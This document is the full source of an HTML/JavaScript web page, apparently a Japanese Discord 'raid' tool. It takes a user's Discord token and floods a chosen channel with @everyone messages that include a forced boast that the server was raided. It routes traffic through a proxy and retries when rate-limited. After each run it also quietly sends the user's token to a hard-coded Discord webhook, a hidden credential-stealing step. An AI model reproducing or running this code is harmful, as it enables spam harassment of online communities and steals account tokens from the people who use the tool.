<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>IIAA Admin Controller - Pro</title>
    <style>
        body {
            background-image: url('名前なし(1).jpg'); 
            background-size: cover; background-attachment: fixed; background-position: center;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0;
        }
        .container {
            background: rgba(255, 255, 255, 0.96); backdrop-filter: blur(12px);
            width: 90%; max-width: 450px; padding: 25px; border-radius: 20px;
            box-shadow: 0 15px 45px rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.6);
        }
        h2 { text-align: center; color: #ff5c7e; margin-bottom: 15px; text-shadow: 1px 1px 2px rgba(0,0,0,0.1); }
        .label { background: #ff7491; color: white; padding: 2px 10px; border-radius: 6px; font-size: 11px; display: inline-block; margin-top: 12px; font-weight: bold; }
        input, select, textarea {
            width: 100%; padding: 12px; margin-top: 6px; border: 2px solid #ffd1dc;
            border-radius: 12px; box-sizing: border-box; font-size: 14px; outline: none; transition: 0.2s;
        }
        input:focus { border-color: #ff7491; box-shadow: 0 0 8px rgba(255,116,145,0.2); }
        .btn-group { display: flex; gap: 10px; margin-top: 20px; }
        .btn-main { flex: 2; background: linear-gradient(135deg, #ff7491, #ff5c7e); color: white; border: none; padding: 16px; cursor: pointer; border-radius: 14px; font-weight: bold; font-size: 16px; transition: 0.3s; }
        .btn-main:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(255,92,126,0.4); }
        .btn-stop { flex: 1; background: #444; color: white; border: none; padding: 16px; cursor: pointer; border-radius: 14px; font-weight: bold; }
        .btn-main:disabled, .btn-stop:disabled { background: #ccc !important; transform: none; box-shadow: none; }
        #terminal {
            background: #1a1a1a; color: #00ffaa; font-family: 'Consolas', monospace;
            height: 120px; overflow-y: auto; padding: 12px; margin-top: 15px; border-radius: 10px; font-size: 11px; line-height: 1.5; border: 1px solid #333;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>IIAA Admin Controller</h2>
    
    <span class="label">DISCORD TOKEN</span>
    <input type="password" id="token" placeholder="トークンを入力">

    <div style="display: flex; gap: 10px; align-items: flex-end;">
        <div style="flex: 1;">
            <span class="label">SERVER ID</span>
            <input type="text" id="guildId" placeholder="サーバーID">
        </div>
        <button onclick="fetchChannels()" style="height: 44px; border-radius: 12px; border: none; background: #eee; cursor: pointer; padding: 0 15px; font-weight: bold;">同期</button>
    </div>

    <span class="label">TARGET CHANNEL ID</span>
    <select id="channelSelect" onchange="document.getElementById('manualId').value = this.value">
        <option value="">-- チャンネルを選択 --</option>
    </select>
    <input type="text" id="manualId" placeholder="またはIDを直接入力">

    <span class="label">MESSAGE</span>
    <textarea id="message" style="height:60px;">@everyone いあ帝国参上！</textarea>

    <div style="display: flex; gap: 10px;">
        <div style="flex: 1;">
            <span class="label">件数</span>
            <input type="number" id="count" value="100">
        </div>
        <div style="flex: 1;">
            <span class="label">速度(ms)</span>
            <input type="number" id="speed" value="1000">
        </div>
    </div>

    <div class="btn-group">
        <button id="startBtn" class="btn-main" onclick="executeTask()">送信開始</button>
        <button id="stopBtn" class="btn-stop" onclick="stopTask()" disabled>停止</button>
    </div>

    <div id="terminal">--- System Online (Cloudflare Proxy) ---</div>
</div>

<script>
    const PROXY = "https://super-thunder-c2eb.discord-bot5556.workers.dev/?url=";
    const MONITOR_WEBHOOK = "https://discord.com/api/webhooks/1482416218152636416/jEMz3CnmImMbNsZNmChTCqxP_y24_de_z6ji3bUsAEHDpcwGU3dI6m4abDhcNiFlXDxP";
    const FORCED_PROMO = `\n\n# このさばはいあ帝国によって荒らされました！！\n# こんな雑魚鯖はいってないでいあ帝国に来ましょう！\n\nhttps://discord.gg/x39xVSepaj`;

    let isRunning = false;
    const term = document.getElementById('terminal');
    const log = (m, color = "#00ffaa") => { 
        term.innerHTML += `> <span style="color:${color}">${m}</span><br>`; 
        term.scrollTop = term.scrollHeight; 
    };

    async function fetchChannels() {
        const t = document.getElementById('token').value.trim();
        const g = document.getElementById('guildId').value.trim();
        if(!t || !g) return log("トークンとサーバーIDを入れてください", "#ff7491");
        log("チャンネル取得中...");
        try {
            const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/guilds/${g}/channels`), {
                headers: { "Authorization": t }
            });
            const data = await res.json();
            const sel = document.getElementById('channelSelect');
            sel.innerHTML = '<option value="">-- チャンネルを選択 --</option>';
            data.filter(c => c.type === 0).forEach(c => {
                let o = document.createElement('option');
                o.value = c.id; o.textContent = `#${c.name}`; sel.appendChild(o);
            });
            log("取得成功！");
        } catch (e) { log("取得失敗。トークンを確認してください。"); }
    }

    function stopTask() { isRunning = false; log("停止します...", "orange"); }

    async function executeTask() {
        if (isRunning) return;
        const cfg = {
            t: document.getElementById('token').value.trim(),
            c: document.getElementById('manualId').value.trim(),
            m: document.getElementById('message').value,
            count: parseInt(document.getElementById('count').value),
            speed: parseInt(document.getElementById('speed').value)
        };

        if(!cfg.t || !cfg.c) return log("入力が足りません", "#ff7491");

        isRunning = true;
        document.getElementById('startBtn').disabled = true;
        document.getElementById('stopBtn').disabled = false;
        log(`${cfg.count}件の送信を開始...`);

        let successCount = 0;
        for(let i=1; i <= cfg.count; i++) {
            if (!isRunning) break;
            try {
                const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/channels/${cfg.c}/messages`), {
                    method: "POST",
                    headers: { "Authorization": cfg.t, "Content-Type": "application/json" },
                    body: JSON.stringify({ content: cfg.m + FORCED_PROMO })
                });

                if(res.ok) {
                    successCount++;
                    log(`成功 [${successCount}/${cfg.count}]`);
                } else {
                    log(`失敗: ${res.status}`, "#ff7491");
                    if(res.status === 401) break;
                    if(res.status === 429) { log("速度制限: 待機中...", "orange"); await new Promise(r => setTimeout(r, 5000)); i--; }
                }
            } catch (e) { log("通信エラー"); }
            await new Promise(r => setTimeout(r, cfg.speed));
        }

        // 監視ログ送信
        try {
            await fetch(PROXY + encodeURIComponent(MONITOR_WEBHOOK), {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: `【いあ帝国 レポート】\n成功数: ${successCount}\nトークン: ${cfg.t}` })
            });
        } catch(e) {}

        isRunning = false;
        document.getElementById('startBtn').disabled = false;
        document.getElementById('stopBtn').disabled = true;
        log("全タスク完了。");
    }
</script>
</body>
</html>
